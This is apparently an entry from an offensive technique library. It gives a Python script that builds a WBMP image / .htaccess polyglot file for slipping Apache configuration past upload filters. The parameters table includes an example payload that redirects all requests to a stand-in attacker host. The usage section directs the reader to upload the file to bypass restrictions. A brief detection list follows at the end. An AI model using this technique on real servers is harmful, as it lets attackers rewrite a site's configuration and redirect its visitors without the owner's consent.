---
id: 4893ba21-7f7a-4b47-87c3-88f12efe9399
name: create-htaccess-wbmp-image-python
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:40.894537+00:00'
updated_at: '2023-04-06T03:56:40.905347+00:00'
platforms:
  - linux
  - web
tags:
  - polyglot
  - htaccess
  - wbmp
validated: true
---

# create-htaccess-wbmp-image-python

## Code

```python
# create valid .htaccess/wbmp image

type_header = b'\x00'
fixed_header = b'\x00'
width = b'50'
height = b'50'
payload = b'# .htaccess file'

with open('.htaccess', 'wb') as htaccess:
    htaccess.write(type_header + fixed_header + width + height)
    htaccess.write(b'\n')
    htaccess.write(payload)
```

## Description

This Python script creates a polyglot WBMP image file embedding .htaccess content. It uses binary WBMP headers (type 0, fixed 0, width/height as ASCII bytes) followed by the payload, ensuring MIME detection as WBMP while allowing Apache to interpret the directives.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| type_header | WBMP type byte | b'\x00' |
| fixed_header | Fixed WBMP header byte | b'\x00' |
| width | Width as 7-bit ASCII bytes (string) | b'50' |
| height | Height as 7-bit ASCII bytes (string) | b'50' |
| payload | Bytes containing .htaccess directives | b"RewriteEngine On\nRewriteRule ^(.*)$ http://attacker.com [R=301,L]" |

## Usage

Update the payload with custom .htaccess rules and adjust width/height bytes if required by the validator. Run to generate '.htaccess', verify as WBMP, and upload to bypass restrictions on Apache-based web apps.

## Detection

- Binary files with WBMP headers but extractable Apache config strings.
- Upload scanners checking for non-image content after monochrome headers.
- Server-side logging of .htaccess effects from uploaded images.
- Signatures for WBMP + Rewrite patterns in file analysis tools.

## Related

- [[procedures/Image-Based-htaccess-Upload-Bypass]]
